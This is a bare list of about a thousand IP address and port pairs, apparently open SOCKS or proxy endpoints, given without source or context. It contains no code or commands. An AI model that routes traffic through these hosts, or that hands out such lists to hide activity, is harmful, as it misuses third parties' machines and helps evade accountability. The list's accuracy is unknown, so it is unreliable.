191.181.243.179:5678
187.84.191.129:38392
202.60.225.49:56894
213.240.224.24:5678
202.21.115.94:44574
202.57.46.140:4145
203.190.52.2:5430
202.62.9.131:5678
200.97.6.242:4153
89.171.144.168:5678
41.190.39.125:1080
85.208.76.2:4153
45.123.25.121:54913
103.253.154.155:41762
103.248.40.110:5678
103.224.48.38:31433
103.153.139.165:1080
103.199.159.145:41610
103.47.93.249:1080
103.251.214.167:6667
103.25.46.218:4153
125.26.5.41:4153
93.171.224.50:4153
89.201.193.85:1080
125.26.4.197:4145
91.210.47.85:30806
64.119.30.126:5678
5.160.184.247:4145
154.66.108.32:3629
162.12.217.70:3629
168.181.63.246:5678
170.80.71.78:5678
170.84.50.226:4153
83.151.4.172:47036
89.24.76.185:34482
182.253.62.194:4153
178.23.149.205:5678
181.143.45.21:4153
177.72.112.169:31164
179.40.75.1:61362
62.183.98.181:4145
190.94.252.254:5678
187.62.191.3:33428
189.91.85.133:31337
190.12.95.170:37209
189.113.77.17:5678
189.51.19.248:5678
192.111.135.17:18302
188.93.235.3:5678
202.62.9.140:5678
62.248.101.5:5678
216.245.192.130:18669
202.62.47.190:4153
202.59.173.203:1080
204.101.61.81:4145
203.215.181.222:36342
201.157.254.134:4145
89.249.222.218:5678
41.60.228.9:5678
103.35.108.198:4145
103.28.86.241:57230
103.235.199.43:5678
103.164.190.221:5430
103.199.97.5:39825
103.54.19.185:4145
103.53.112.124:5678
103.25.46.238:4153
94.158.152.248:46846
89.222.132.31:3629
45.142.212.31:30002
92.51.78.66:4153
88.119.204.62:4153
5.189.184.146:55231
159.65.170.145:59601
168.232.41.148:5678
168.228.207.98:5678
85.118.105.20:45227
89.28.120.19:39142
80.82.147.4:4153
41.242.66.187:5678
182.253.69.218:5678
179.27.214.238:4153
181.143.5.45:5678
177.8.170.122:1080
181.114.232.54:31337
192.111.129.145:16894
187.62.86.129:5678
190.109.72.244:33633
190.210.3.211:1080
189.16.248.226:5678
190.119.167.11:5678
192.111.135.18:18301
189.113.75.9:5678
203.169.27.149:5678
64.124.145.1:1080
216.245.192.130:20894
203.189.159.161:3629
103.49.189.14:5678
103.47.93.214:1080
103.247.21.204:5678
103.203.65.2:48685
103.235.66.198:5678
103.58.75.24:5678
103.70.159.142:5678
103.35.108.145:4145
43.224.10.22:6667
94.179.135.230:58516
90.156.6.97:5678
89.25.23.212:4153
93.78.205.125:3380
201.18.144.234:5678
89.108.81.117:1080
5.34.74.214:4145
159.65.88.184:43768
169.255.189.106:4145
170.246.85.106:37163
203.223.44.214:5678
206.42.35.65:4153
89.186.5.146:1080
89.28.32.203:57391
81.12.104.35:3629
43.245.243.58:5678
182.48.89.102:3629
179.96.20.138:4145
181.143.69.27:4145
177.91.126.125:5678
181.129.70.82:44357
202.79.20.67:5678
192.111.130.2:4145
187.84.191.90:4153
190.196.20.166:44907
190.249.169.153:3629
190.103.240.57:4153
190.128.28.69:4153
192.111.137.34:18765
189.126.187.38:4153
203.176.134.226:4153
103.70.204.65:59311
103.81.117.225:4153
103.25.120.138:44550
103.236.160.129:4145
103.242.104.245:5678
103.66.232.1:4145
103.75.148.70:4145
103.35.168.53:4153
43.224.10.33:6667
94.181.33.149:40840
91.198.137.31:3552
91.198.137.31:3501
212.19.7.134:5678
95.111.91.50:10801
201.187.102.73:5678
89.190.44.185:4153
50.96.204.7:18351
168.121.137.122:4145
170.81.141.49:61437
170.254.255.233:45816
206.189.118.100:18938
210.245.51.19:4145
89.218.5.110:50733
91.198.137.31:3574
83.147.152.1:4145
45.112.125.54:4145
180.180.152.94:4145
181.15.119.210:4153
177.93.76.6:4145
181.166.106.224:42315
206.84.99.205:5678
192.166.255.200:4145
188.0.117.41:5678
190.85.212.170:5678
190.61.85.236:4153
190.108.193.17:5678
190.145.77.219:4153
192.144.104.1:33283
189.2.164.165:4153
208.102.51.6:58208
103.77.227.197:4153
103.93.106.105:4153
103.255.121.155:4153
103.241.227.100:6667
103.38.205.17:5678
103.69.216.250:5678
103.78.252.108:5678
103.41.28.70:4145
43.224.10.57:6667
95.161.188.246:61537
92.241.66.138:4145
91.198.137.31:3512
212.200.161.241:5678
202.131.233.187:5678
91.198.137.31:3507
58.49.116.78:30957
169.239.236.101:10801
170.84.83.161:5678
209.13.96.163:39921
213.109.7.55:5678
89.250.149.114:59599
91.221.240.254:1080
83.171.114.92:56129
45.125.63.46:44110
216.245.192.130:34816
180.92.212.200:5678
181.209.71.22:4153
178.168.91.178:5678
182.160.124.26:5678
207.241.178.137:8899
192.252.215.2:4145
188.138.254.218:4145
191.98.196.15:5678
191.53.112.170:35618
190.109.75.253:33633
190.2.212.11:5678
192.159.39.30:3629
103.83.179.38:5678
106.240.89.60:4145
103.47.93.196:1080
103.242.107.243:4145
103.59.203.209:4145
103.84.39.101:30740
103.78.27.43:4145
103.70.159.153:5678
43.250.127.98:4153
95.216.146.217:1448
93.116.254.90:1080
91.230.199.174:32151
213.174.0.72:1080
209.52.84.136:5678
202.148.26.124:5678
91.198.137.31:3571
60.22.22.15:1080
170.80.91.65:4145
171.100.8.82:49181
190.12.5.21:4153
210.211.109.122:808
216.245.192.130:11696
91.150.189.122:60647
93.171.224.44:4153
83.97.106.117:3629
45.129.123.101:4153
219.83.125.235:4145
181.114.232.59:31337
182.160.124.106:5678
178.212.48.18:5678
182.93.84.136:56541
212.126.5.242:42344
192.252.215.5:16137
188.166.104.152:20643
192.111.135.21:4145
192.111.137.35:4145
190.149.216.74:48344
190.211.160.117:32410
192.252.208.67:14287
103.85.67.94:4145
103.47.93.223:1080
103.245.206.145:34432
103.70.159.149:5678
103.86.1.2:4145
103.87.169.246:5678
103.79.96.166:4153
98.162.25.4:31654
94.159.1.10:4153
93.126.17.229:5678
213.7.196.26:4153
210.245.51.20:4145
202.150.148.218:61924
91.222.113.175:5678
62.201.233.59:4145
190.153.253.5:4145
210.56.244.186:4145
217.169.222.225:1080
91.193.125.123:3629
93.87.140.199:5678
84.22.138.150:4145
45.146.13.219:5678
222.83.251.211:4145
181.129.134.138:5678
180.94.64.101:5678
212.50.19.150:4153
193.105.62.11:58973
105.234.156.53:4145
193.34.161.137:44436
103.54.148.46:1080
103.47.93.204:1080
103.76.172.230:4153
104.248.162.187:24076
104.255.170.70:56541
103.80.237.93:5678
190.211.80.10:5678
94.23.83.149:4153
94.182.25.74:4145
217.219.179.126:4153
210.48.139.226:4145
202.21.115.202:4153
92.245.102.242:1080
190.211.82.6:5678
192.252.208.70:14282
190.181.100.1:4153
212.156.55.34:5678
217.24.189.67:5678
91.194.239.122:5678
94.136.157.89:60030
84.51.33.54:4153
45.172.135.230:4145
181.204.4.74:5678
192.111.139.163:19404
181.114.171.28:5678
109.87.78.144:4145
193.70.46.201:44396
103.76.15.203:5678
103.47.93.250:1080
103.78.38.34:5430
105.29.75.113:4153
106.51.72.222:4153
103.85.67.114:4145
192.81.225.169:33140
193.91.70.1:4153
95.86.32.4:59341
95.169.213.76:4145
218.106.167.98:4145
213.164.120.144:7899
203.128.72.62:4145
93.171.224.58:4153
212.69.12.81:1080
190.233.243.175:5678
192.252.211.197:14921
190.210.93.9:4153
213.101.151.4:1080
217.78.61.96:5678
91.198.137.31:3561
95.165.163.188:36496
85.114.112.166:5678
189.89.142.29:4145
181.209.86.171:58682
192.225.110.51:5678
103.76.201.118:8291
103.60.212.113:51754
103.80.237.162:4145
109.238.189.104:4145
109.120.218.158:10801
103.95.97.186:31244
218.64.129.3:5678
213.6.38.50:59422
203.80.170.19:5678
93.182.76.244:5678
213.175.167.3:5678
192.111.137.37:18762
192.252.214.20:15864
190.220.1.173:35376
213.109.235.89:4153
218.86.87.171:42086
91.198.137.31:3575
192.252.209.155:14455
181.236.221.138:4145
103.79.96.173:4153
103.83.36.1:5678
103.83.179.37:5678
109.238.219.225:4153
109.224.12.170:52015
106.242.20.219:4145
190.103.240.4:4153
181.129.181.101:5678
87.121.49.238:4145
95.31.35.210:3629
217.11.180.168:5678
203.86.239.8:1080
94.247.241.70:51006
217.66.206.146:5678
193.117.138.126:56341
190.244.133.103:4153
213.165.160.251:5678
182.52.58.44:4153
103.82.11.237:4153
103.84.175.65:4153
103.99.110.222:5678
109.68.189.22:54643
109.173.96.85:3629
190.104.26.227:33638
181.143.45.19:4153
88.151.251.195:5678
98.162.25.23:4145
91.202.79.10:3629
217.219.179.58:4153
212.129.25.12:32939
95.142.223.24:52666
221.2.71.10:4153
222.129.33.178:57114
193.163.116.20:1080
213.186.202.149:5678
182.52.70.117:4145
103.95.97.53:4153
103.87.201.135:4145
190.63.160.61:4145
190.109.72.41:33633
181.143.45.20:4153
89.237.33.129:51549
98.162.96.52:4145
92.84.56.10:47054
218.17.228.106:1080
212.154.251.210:5678
95.77.104.79:37975
213.6.68.94:5678
182.93.69.74:5678
104.236.45.251:1089
104.131.8.62:10994
222.252.12.251:5678
190.89.89.157:4153
190.123.90.242:4153
181.143.69.227:5678
89.36.162.249:4145
93.177.190.203:5678
216.183.40.241:39072
105.244.32.86:4153
104.255.170.69:50503
96.69.76.161:5678
191.53.47.118:4145
212.5.159.2:10801
191.180.206.74:4153
181.3.91.210:1080
91.192.201.17:1111
217.30.253.242:4145
93.178.200.122:52281
106.15.60.37:7890
105.213.127.74:5678
96.89.5.21:34032
221.230.78.59:4153
191.97.2.198:5678
212.98.147.59:4153
192.111.129.150:4145
181.78.24.30:5678
91.202.133.37:4153
222.124.34.196:5678
93.184.151.48:5678
109.122.86.234:4153
109.247.232.235:5678
98.170.57.231:4145
192.111.130.5:17002
213.6.145.33:4153
192.111.138.29:4145
182.23.4.130:5678
222.212.85.16:7000
93.51.54.187:9050
109.238.208.138:51372
109.94.182.9:4145
91.221.240.252:1080
193.28.177.52:3629
213.6.162.158:1080
192.111.139.165:19402
222.252.21.100:5678
93.77.8.247:5678
109.238.223.67:61150
92.118.202.224:5678
222.74.65.72:38051
93.87.74.222:4153
192.111.139.165:4145
213.6.77.198:5678
94.20.21.7:4153
92.42.8.22:4153
193.111.223.200:51327
213.76.114.107:5678
94.228.17.3:5678
92.51.92.213:4145
193.40.176.50:4153
213.81.129.238:14888
94.26.108.67:2580
95.154.75.180:45735
213.82.192.26:1088
96.88.1.195:1080
95.158.139.61:10801
216.245.192.130:12191
98.162.25.29:31679
95.163.141.85:4145
216.245.192.130:24579
98.178.72.21:10919
95.31.5.29:51528
216.245.192.130:27337
99.26.74.89:39593
98.162.25.7:31653
216.245.192.130:9063
217.170.254.211:3629
98.175.31.195:4145
217.219.91.144:4153
222.165.205.154:5678
195.29.106.2:4153
184.181.217.204:4145
176.236.14.2:4153
77.46.138.1:33608
103.36.11.161:4145
195.68.152.18:4153
210.245.51.43:4145
79.108.206.93:4145
197.234.13.40:4145
195.22.253.238:4145
101.51.141.2:4153
178.128.58.12:9050
203.170.67.157:4145
190.228.171.11:4145
178.173.171.10:4145
154.79.254.176:10801
209.13.96.166:39921
116.232.115.203:4145
103.210.31.49:31433
190.196.66.76:33371
103.68.35.166:4145
103.44.14.129:4145
204.101.61.82:4145
103.233.154.19:4145
92.247.127.217:4153
50.84.210.194:39593
177.91.44.97:4153
45.117.228.153:4145
122.102.43.82:59725
51.83.185.71:9095
202.72.209.3:44550
201.59.201.92:61150
59.91.122.1:46726
88.255.217.114:1080
201.159.95.125:39618
188.166.104.152:4975
197.210.120.76:5678
134.236.242.161:4153
59.153.83.170:1081
95.84.197.36:4153
217.113.22.18:3629
119.57.115.55:30622
91.134.50.251:1337
202.168.146.126:1080
200.119.125.194:58564
1.20.100.111:41480
103.207.96.21:61287
61.247.178.158:36187
92.249.219.47:59587
194.38.0.163:4145
202.129.52.171:4153
180.210.222.101:1080
79.101.40.114:4153
123.213.70.176:4145
118.70.220.116:4145
176.104.243.57:4153
103.239.255.170:58733
186.84.174.13:59341
103.211.8.129:52616
103.76.148.241:4145
83.168.84.130:4153
79.106.35.139:1080
78.38.123.110:4153
185.51.92.84:51327
202.138.242.6:38373
92.39.70.138:60722
103.120.135.33:4145
45.7.177.188:39867
121.58.243.202:4145
210.245.51.14:4145
110.77.145.159:4145
162.247.18.162:4153
103.10.133.81:4153
213.0.92.122:4153
84.224.46.220:4145
195.78.112.235:39401
194.135.75.74:34768
45.7.177.249:39867
195.13.188.150:4153
186.208.112.246:4153
188.255.213.97:1080
90.181.150.211:4145
90.146.16.34:4145
131.221.148.73:4153
213.56.166.35:1080
67.22.223.9:39593
103.107.68.149:5430
113.160.234.147:31797
170.0.203.10:1080
77.244.42.178:4145
50.235.92.65:32100
116.58.247.161:4145
1.9.167.36:60489
177.54.195.48:4145
222.173.92.154:32075
177.105.68.70:4153
177.66.247.233:4145
103.220.207.242:1080
103.107.92.209:34083
190.215.220.37:33371
190.217.68.211:4145
80.123.143.202:30622
185.183.12.25:4145
125.27.10.84:4153
43.252.183.66:4153
203.160.63.49:4145
103.37.82.38:61409
103.109.59.77:1080
119.82.253.24:61910
176.52.253.14:4145
185.46.221.11:4153
5.83.104.173:4153
41.190.92.84:41207
200.85.139.57:4153
91.230.138.11:4145
80.70.22.16:4153
77.120.163.103:42208
185.27.60.83:53292
202.186.230.87:4145
203.170.68.97:4145
121.58.243.205:4145
177.12.177.53:4153
178.254.148.37:1080
168.0.8.36:4153
202.62.99.170:4145
188.119.30.83:4153
201.93.159.234:4145
222.129.34.219:57114
212.3.146.80:3629
43.241.30.222:4145
116.239.4.130:4145
203.150.113.197:14153
118.172.47.97:51327
95.79.112.74:3629
177.184.67.61:4145
103.85.106.109:4153
78.60.203.75:54471
203.160.61.104:4145
202.58.108.98:36819
213.14.25.69:1080
154.61.227.8:64312
77.92.53.7:4145
46.254.240.106:43310
45.70.237.162:4145
218.81.0.91:4145
83.69.90.191:1099
103.110.59.3:35294
92.247.125.169:4153
116.90.122.234:4145
186.248.111.102:5678
202.58.108.1:36819
217.25.198.133:4145
103.82.233.2:1089
132.255.94.150:4153
37.221.204.206:35433
196.0.113.10:31651
194.213.43.166:59316
146.196.98.202:4153
202.144.201.35:43870
89.201.145.59:1080
200.199.8.113:35938
121.40.51.48:1080
36.89.188.123:48183
89.237.33.60:51549
103.83.173.234:4145
87.247.3.234:46511
46.38.0.135:4153
103.87.228.84:4145
117.222.62.103:42981
86.105.57.12:4153
185.66.228.149:4145
176.221.116.10:4145
67.206.200.42:4153
201.82.6.49:4153
197.211.209.236:61253
94.101.138.16:4153
45.7.177.10:52246
118.97.107.65:5430
103.111.55.210:46154
168.227.146.34:10801
118.97.204.93:51372
81.163.36.139:4145
103.51.44.41:4145
157.119.50.74:1080
177.105.68.135:4153
81.17.81.34:4145
84.243.108.186:3629
113.53.29.218:45189
202.62.227.41:31606
178.150.237.227:4145
188.65.237.16:3629
82.155.28.72:34245
177.74.143.97:4145
93.63.75.62:1080
202.29.226.54:4153
182.253.243.16:5678
210.48.204.134:54391
212.1.97.230:4145
1.179.198.226:56428
195.210.172.43:58350
103.87.206.249:41916
93.99.13.46:4153
95.156.125.190:55711
190.144.224.182:44550
91.121.33.63:1000
121.205.216.231:1080
155.133.83.61:58351
46.182.130.71:3629
69.163.161.209:38713
86.120.79.84:4145
190.182.88.214:30956
79.125.162.222:4145
45.124.171.145:4145
43.225.150.154:10801
103.107.92.225:34083
168.227.158.9:4145
80.71.112.116:55243
103.66.233.137:4145
103.240.33.169:8291
89.132.116.240:4145
103.60.181.210:31248
103.78.213.73:4145
91.98.4.130:4145
190.109.72.21:33633
103.57.80.58:4145
109.86.225.146:4145
91.147.210.86:4145
213.219.210.180:4145
177.91.44.96:4153
5.63.187.116:36684
103.115.255.65:36331
189.2.127.243:4153
89.22.17.62:43110
92.86.92.126:42740
114.6.74.102:1080
45.226.48.61:34739
117.220.171.209:4153
1.10.189.84:44452
180.180.170.188:3629
131.221.217.141:4145
88.12.14.233:4153
61.19.40.50:58377
177.129.207.36:4153
113.53.82.92:35731
193.193.240.36:48785
189.44.178.170:4145
170.84.48.105:55731
185.5.246.222:4153
1.186.40.2:39651
180.210.222.105:1080
91.211.172.104:46344
103.106.112.11:5430
200.218.242.97:4153
103.107.92.1:44578
1.4.157.35:36202
189.201.191.17:4145
183.88.240.53:4145
170.84.48.48:4145
117.54.200.134:443
103.115.255.141:36331
116.226.98.221:4145
186.177.141.223:48683
177.129.17.52:54962
186.224.225.98:4145
103.134.202.26:1080
103.229.85.22:4145
186.219.211.6:39427
169.255.65.254:1080
122.200.150.249:4153
186.1.181.62:4153
201.204.168.106:45923
179.108.158.122:4145
83.234.76.155:4145
79.124.23.9:4153
200.41.150.83:61084
181.112.154.170:45032
103.116.203.245:40927
207.97.174.134:1080
187.33.70.110:4153
103.61.198.234:4145
91.192.2.168:30226
95.140.27.135:59193
186.211.2.54:4145
77.121.5.131:1080
118.174.233.45:55084
180.211.179.150:40153
88.85.97.150:4153
185.134.99.238:4153
177.10.200.110:4145
189.51.116.5:4145
108.29.77.74:54321
203.209.190.154:4153
119.243.95.62:1080
103.250.148.82:41889
190.196.66.74:33371
150.129.57.251:4153
115.231.175.80:3000
41.162.107.130:1080
182.78.194.78:55664
186.193.2.22:31063
190.217.1.9:55170
148.77.34.194:44070
192.169.201.24:60541
85.238.167.170:42762
177.69.45.188:33219
27.54.166.212:57995
192.158.15.201:50877
91.205.146.79:3629
89.173.82.166:4153
91.203.114.71:42905
85.105.156.8:4153
89.237.34.190:51549
187.111.193.95:44681
188.255.209.21:1080
203.160.63.113:4145
78.92.254.9:53718
188.255.208.246:1080
202.29.218.138:4153
190.138.206.18:31680
180.211.91.190:5430
187.111.193.81:44681
103.106.35.41:31110
170.239.255.253:4145
105.27.143.174:4153
123.231.230.58:31196
170.238.73.46:4153
103.200.37.31:1080
101.51.141.81:4153
5.58.47.25:3629
148.77.34.200:54321
191.253.89.73:4145
114.242.116.51:4145
197.234.13.92:4145
168.227.41.201:5678
103.248.30.2:5678
177.72.113.225:31164
103.48.183.113:4145
103.135.174.130:1080
110.78.153.49:4145
185.155.34.81:4153
202.51.178.126:59341
106.104.151.142:53046
177.87.223.194:49233
175.100.103.132:1081
177.72.113.246:53025
176.106.36.183:1080
154.72.197.106:61423
168.195.196.25:53496
36.67.66.100:32404
103.47.218.76:4145
218.26.101.226:53813
69.163.163.24:37628
190.234.135.232:4153
85.196.136.9:4153
212.170.207.29:4153
191.243.72.2:4145
82.114.94.68:59311
177.91.9.17:59515
116.237.143.152:4145
203.217.169.217:4153
78.188.61.165:4145
185.178.220.126:32000
92.247.127.161:4153
45.79.207.110:9200
220.247.166.135:34432
77.236.196.27:4153
62.87.151.138:40402
103.107.94.185:34083
1.20.96.156:4153
45.7.176.234:52246
202.6.224.51:1080
94.232.11.178:58028
195.225.49.131:55774
45.228.96.2:4153
45.116.3.249:4145
117.252.65.119:5678
138.59.140.77:57669
85.29.147.222:4145
191.7.209.74:39383
176.98.75.120:49697
95.0.66.97:1080
45.230.200.121:5678
177.223.58.68:48733
187.60.41.254:4145
134.249.151.4:54965
222.184.254.170:40044
179.106.150.5:59624
60.161.153.36:57114
103.85.106.107:4153
85.125.194.18:1080
37.57.40.167:4145
45.117.228.81:4145
193.109.42.114:4153
165.22.43.8:30081
80.82.147.2:4153
181.129.59.108:4153
72.139.68.174:40048
36.84.100.165:34432
200.85.169.18:50577
118.174.232.106:48954
103.85.122.20:4145
202.29.226.134:32241
110.78.186.155:4145
98.126.23.24:2942
220.175.145.63:57114
176.236.163.36:59311
186.47.82.6:46723
176.98.95.105:30759
103.78.27.36:4145
212.42.116.29:4145
98.188.47.150:4145
187.72.239.185:4145
181.129.51.147:47562
113.53.83.212:30724
178.93.34.64:10801
164.163.250.83:4145
46.227.37.37:1088
114.69.232.37:4145
62.176.1.194:56069
103.69.20.99:4145
46.8.33.245:4153
109.87.143.67:10801
45.124.24.215:1080
200.218.242.117:4153
176.227.188.16:4145
170.247.112.77:4145
96.9.79.233:58618
92.242.126.154:44718
89.28.14.239:4145
222.129.34.51:57114
202.91.188.81:4145
109.122.81.9:57553
103.44.18.248:4145
113.105.180.62:4145
81.219.10.62:4145
88.213.214.254:4145
185.75.5.158:43131
91.143.46.78:4153
92.247.31.37:4145
103.31.157.205:4145
123.201.131.62:1080
41.79.49.23:4145
87.124.164.13:4145
46.214.161.163:4153
103.15.242.215:55492
89.251.147.97:30048
178.22.221.201:4145
80.53.255.194:4153
5.196.63.119:1080
222.74.69.234:38051
1.179.183.73:61468
77.241.20.215:55915
93.64.183.162:32889
103.250.68.66:54621
179.108.249.118:1080
103.221.254.102:54409
103.107.68.13:5430
103.212.92.253:41363
88.12.19.206:4145
200.53.217.25:32866
59.152.111.241:41542
77.120.93.135:52263
190.228.171.254:4145
14.201.234.2:43238
103.138.212.218:31016
196.25.237.218:58902
86.57.181.122:51801
213.81.178.190:4145
87.103.175.22:1080
177.37.166.166:4153
43.245.94.226:4153
103.211.11.41:52616
78.188.119.253:5678
187.111.193.88:44681
79.165.225.234:4153
154.79.242.178:10801
103.105.237.254:53977
46.8.159.147:4145
101.51.106.70:39164
202.70.34.82:47642
182.73.143.146:53977
106.51.2.56:4145
83.168.84.142:4153
36.91.54.25:39529
82.99.203.76:58523
103.4.94.178:41350
181.129.49.4:31240
186.204.78.90:4153
43.230.62.157:4145
202.51.116.34:5430
106.242.5.206:4145
37.235.212.243:4145
187.33.92.54:4153
110.78.147.48:4145
96.9.66.187:1081
181.143.223.139:4145
80.71.112.108:55243
177.22.111.246:4145
31.131.159.31:4153
45.4.55.10:40486
103.52.37.1:4145
200.34.227.204:4153
190.109.74.1:33633
200.54.221.202:4145
36.67.66.202:5678
168.121.139.199:4145
101.255.117.2:51122
45.70.0.250:4145
78.159.199.217:1080
67.206.213.202:4145
14.161.48.4:4153
119.10.179.33:5430
109.238.222.1:4153
103.232.64.226:4145
116.58.227.197:4145
1.20.97.181:34102
89.25.23.211:4153
185.43.249.132:39316
188.255.209.149:1080
178.216.2.229:1488
92.51.73.14:4153
109.200.156.2:4153
89.237.33.193:51549
211.20.145.204:4153
45.249.79.185:3629
208.113.223.164:21829
62.133.136.75:4153
46.99.135.154:4153
1.20.198.254:4153
118.70.196.124:4145
185.34.22.225:46169
103.47.93.199:1080
222.129.34.122:57114
92.247.127.249:4153
186.150.207.141:1080
202.144.201.197:43870
103.106.32.105:31110
200.85.137.46:4153
116.58.254.9:4145
101.51.141.122:4153
83.69.125.126:4145
187.62.88.9:4153
122.54.134.176:4145
170.0.203.11:1080
187.4.165.90:4153
103.15.242.216:55492
187.216.81.183:37640
176.197.100.134:3629
101.51.105.41:4145
46.13.11.82:4153
103.221.254.125:40781
1.10.189.133:50855
69.70.59.54:4153
83.103.195.183:4145
190.109.168.241:42732
103.76.20.155:43818
84.47.226.66:4145
1.186.60.25:4153
93.167.67.69:4145
202.51.112.22:5430
213.6.204.153:42820
217.171.62.42:4153
121.13.229.213:61401
101.255.140.101:1081
78.189.64.42:4145
190.184.201.146:32606
195.34.221.81:4153
200.29.176.174:4145
103.68.35.162:4145
194.135.97.126:4145
167.172.123.221:9200
200.218.242.89:4153
190.7.141.66:40225
186.103.154.235:4153
118.174.196.250:4153
213.136.89.190:52010
217.25.221.60:4145
50.192.195.69:39792
180.211.162.114:44923
179.1.1.11:4145
41.162.94.52:30022
103.211.11.13:52616
103.209.65.12:6667
101.51.121.29:4153
190.13.82.242:4153
103.240.33.185:8291
202.51.100.33:5430
201.220.128.92:3000
177.11.75.18:51327
62.122.201.170:31871
79.164.171.32:50059
202.124.46.97:4145
79.132.205.34:61731
217.29.18.206:4145
222.217.68.17:35165
105.29.95.34:4153
103.226.143.254:1080
119.82.251.250:31678
45.232.226.137:52104
195.69.218.198:60687
213.108.216.59:1080
178.165.91.245:3629
124.158.150.205:4145
36.72.118.156:4145
177.93.79.18:4145
103.47.94.97:1080
78.140.7.239:40009
187.19.150.221:80
103.192.156.171:4145
36.67.27.189:49524
188.136.167.33:4145
91.226.5.245:36604
78.90.81.184:42636
189.52.165.134:1080
81.183.253.34:4145
95.154.104.147:31387
220.133.209.253:4145
182.52.108.104:14153
195.93.173.24:9050
170.244.64.129:31476
117.102.124.234:4145
190.210.3.210:1080
182.253.142.11:4145
176.98.156.64:4145
210.48.139.228:4145
177.39.218.70:4153
112.78.134.229:41517
119.46.2.245:4145
103.212.94.253:41363
103.94.133.94:4153
190.151.94.2:56093
190.167.220.7:4153
94.136.154.53:60030
103.206.253.59:53934
69.163.160.185:29802
213.6.221.162:5678
96.9.86.70:53304
202.182.54.186:4145
192.140.42.83:59057
138.121.198.90:42494
190.121.142.166:4153
190.0.242.217:51327
82.114.83.238:4153
195.22.253.235:4145
91.219.100.72:4153
212.3.109.7:4145
45.7.177.226:39867
202.5.37.241:49151
195.9.89.66:3629
190.186.1.46:33567
69.163.161.118:20243
120.50.8.2:4145
202.144.201.129:43870
182.253.141.25:4145
168.194.83.45:44328
82.202.99.217:4153
177.93.72.130:4153
51.195.201.48:9095
182.48.83.170:41542
181.129.52.154:44665
59.153.121.170:1080
58.27.237.218:1080
87.255.4.21:4153
109.183.189.238:36729
101.255.54.188:1081
46.146.214.244:31952
103.196.53.209:44110
139.159.48.155:39593
36.66.61.7:46118
89.25.23.210:4153
178.134.153.205:14888
222.129.33.40:57114
181.129.62.67:40729
103.199.157.145:41610
98.126.23.24:2808
45.175.179.230:4145
37.26.136.181:39323
185.237.8.38:4145
91.219.88.121:47334
41.180.82.158:4153
109.94.182.128:4145
200.206.63.34:4145
37.57.3.244:1080
213.109.6.85:60269
109.161.94.251:3629
103.243.46.6:4145
183.89.34.76:4145
62.106.122.90:44818
119.187.146.163:1080
1.53.137.92:4145
138.121.32.182:51372
200.5.251.2:4153
178.48.68.61:4145
117.242.147.97:4153
138.97.2.187:4145
186.249.83.86:4145
103.243.81.252:30384
170.254.92.198:4153
41.85.189.66:39475
168.181.121.195:57010
195.133.153.186:1080
85.185.152.148:4145
200.85.95.234:4153
36.84.59.53:4145
89.22.254.55:4153
168.227.106.100:48609
189.113.217.35:43603
5.83.104.138:4153
117.4.107.199:51796
119.57.115.58:30622
189.201.191.69:4145
197.234.13.18:4145
120.236.253.116:1081
175.141.163.189:4153
177.66.184.237:4153
203.170.67.237:4145
178.134.155.82:49483
188.119.30.75:4153
195.9.80.22:4145
103.211.8.65:52616
118.172.181.147:51411
60.216.101.46:49327
201.184.242.26:4153
194.67.9.178:4153
46.175.186.24:4153
103.194.242.254:40247
185.212.139.40:4145
187.49.207.65:4153
62.94.202.114:4153
119.2.9.169:4145
176.108.176.181:4153
94.206.11.86:59483
69.163.166.172:38713
170.0.52.6:4153
143.255.54.244:59616
179.43.97.40:33238
46.227.36.152:1080
187.125.30.122:4153
122.200.145.129:4153
189.89.168.132:4145
180.183.173.254:8291
109.238.222.5:42401
1.179.173.114:4153
109.188.86.168:4145
187.111.193.80:44681
85.217.192.39:4145
203.153.109.150:49947
206.189.158.28:11007
143.202.136.51:4153
45.250.65.188:5678
103.73.183.4:8291
129.205.244.158:1080
190.128.135.130:44915
45.7.205.103:31083
188.75.139.60:4145
94.198.215.22:52477
190.124.164.78:1080
41.79.236.164:1080
202.166.205.87:58637
190.120.254.17:4145
131.161.68.13:38375
168.227.15.229:50813
103.233.103.237:4153
178.19.247.25:41624
82.76.135.94:3629
72.195.34.41:4145
91.181.235.31:4145
190.215.220.38:33371
187.4.165.58:4153
165.90.51.222:4145
109.75.34.152:59341
79.106.35.61:1080
181.15.154.154:52033
178.254.174.196:4145
144.126.196.87:1080
185.46.170.253:4145
91.233.250.106:4145
159.224.37.181:31429
202.162.219.10:1080
85.237.62.189:3629
197.231.198.172:37765
90.168.34.174:4145
109.86.244.225:57649
77.46.138.37:33608
95.84.158.121:4153
103.60.187.1:52195
45.70.237.172:4145
105.247.28.74:4153
77.239.148.134:4145
190.144.91.252:4153
103.212.92.201:35265
177.38.39.130:9090
186.211.164.14:4153
72.212.63.101:4145
103.52.211.206:1080
177.84.146.29:32720
103.232.33.147:1080
113.53.29.228:13629
87.103.196.236:1080
124.109.44.126:4145
103.106.35.230:31110
131.221.217.176:4145
191.6.135.93:4145
103.35.111.101:4145
213.230.69.33:1080
103.220.207.17:56250
155.0.181.254:41174
46.232.133.26:4153
77.93.42.134:46235
162.216.204.146:1080
119.93.122.233:4145
121.241.90.242:52115
212.56.194.238:4145
45.229.174.75:4145
177.10.144.22:1080
77.89.207.22:4145
191.98.81.192:4153
191.243.54.245:41599
210.245.51.5:4145
116.199.168.1:4145
24.122.219.155:4153
88.255.132.179:1082
106.14.173.45:3129
182.52.30.158:4153
213.14.25.66:1080
110.93.13.190:45034
95.168.96.42:47180
190.217.1.137:55170
162.223.88.228:7777
77.76.151.72:5678
80.240.250.222:4145
110.172.162.249:34047
13.49.144.251:20017
200.215.171.238:5678
186.211.83.6:1080
154.79.252.214:10801
177.36.159.34:4145
194.244.16.58:35573
187.103.15.17:40559
187.111.193.82:44681
93.83.108.58:4153
85.237.191.62:1080
185.218.29.222:30211
80.94.118.192:4145
46.55.25.191:61308
200.218.242.33:4153
84.247.236.114:4153
185.94.219.160:1080
116.202.103.223:12565
188.168.75.254:33654
45.227.159.7:4153
116.0.2.162:47068
213.216.80.33:4153
103.122.66.184:4153
62.244.140.12:33070
190.13.84.221:4145
27.123.3.139:4145
94.154.220.93:5678
79.106.224.231:58437
195.162.81.91:34862
31.206.38.46:37630
43.224.118.46:1080
181.112.48.142:35275
213.173.75.243:4153
37.193.91.79:4153
167.249.212.17:56616
183.87.39.174:40252
103.135.174.14:1080
202.168.146.121:1080
89.22.249.241:4145
103.67.16.6:4153
190.85.65.50:4153
43.252.106.58:4153
185.66.58.140:42647
190.145.174.26:4153
80.71.112.99:55243
79.173.124.177:4153
80.107.16.17:4145
176.108.104.84:38954
85.175.99.105:4145
